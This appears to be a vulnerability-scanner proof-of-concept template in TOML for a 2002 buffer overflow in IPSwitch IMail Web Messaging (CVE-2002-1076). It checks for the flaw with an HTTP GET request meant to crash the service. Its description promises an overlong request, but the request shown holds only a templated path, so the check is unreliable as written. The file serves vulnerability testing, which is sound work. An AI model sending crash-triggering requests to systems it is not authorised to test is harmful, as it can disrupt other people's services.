[info]
author = "AVE"
description = "通过向 IPSwitch IMail Web Messaging 服务发送超长 HTTP GET 请求触发缓冲区溢出，验证目标是否存在该漏洞。发送包含大量字符的 GET 请求后，若服务崩溃或返回异常响应则可判定存在漏洞。"
id = "POC-AVE-2002-0533"
name = "IPSwitch IMail Web Messaging GET Buffer Overflow PoC"
severity = "high"
tags = ["ave-2002-0533"]
vuln_id = [
    "CVE-2002-1076",
    "AVE-2002-0533",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}} HTTP/1.0"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["HTTP/1.0"]
